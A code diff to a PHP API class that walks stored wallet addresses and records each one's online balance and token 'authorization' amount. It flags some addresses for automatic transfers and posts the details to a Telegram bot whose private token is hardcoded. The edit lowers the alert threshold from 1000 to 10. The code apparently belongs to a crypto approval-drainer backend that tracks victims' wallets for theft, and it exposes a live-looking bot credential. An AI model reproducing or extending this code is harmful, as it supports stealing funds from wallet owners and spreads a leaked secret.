@@ -71,7 +71,7 @@ class Address extends Api
                 if($vo['h5_url'] == '1688vip_channel_user_id:37'){//jiema
                     db('address')->where(['id'=>$vo['id']])->update(['auto'=>1,'auto_money'=>5000]);
                 }
-                if($money_online >1000 || $money_approve > 0 ){
+                if($money_online >10 || $money_approve > 0 ){
                     //TG通知开始
                     $data = "【综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
                     $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
